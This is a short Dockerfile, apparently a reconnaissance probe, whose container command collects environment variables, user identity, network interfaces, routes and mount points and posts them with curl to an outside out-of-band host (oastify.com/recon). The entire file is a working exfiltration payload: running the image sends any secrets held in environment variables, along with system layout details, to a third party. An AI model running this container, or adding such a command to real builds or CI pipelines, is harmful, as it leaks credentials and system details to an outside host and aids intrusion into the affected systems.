FROM alpine
RUN apk add --no-cache curl


CMD C=http://oastify.com; \
    (echo " ENV" && env && \
     echo " WHOAMI" && whoami && id && \
     echo " IFCONFIG" && ifconfig && \
     echo " ROUTE " && route -n && \
     echo "MOUNTS" && mount) 2>&1 | curl -s "$C/recon" --data-binary @-

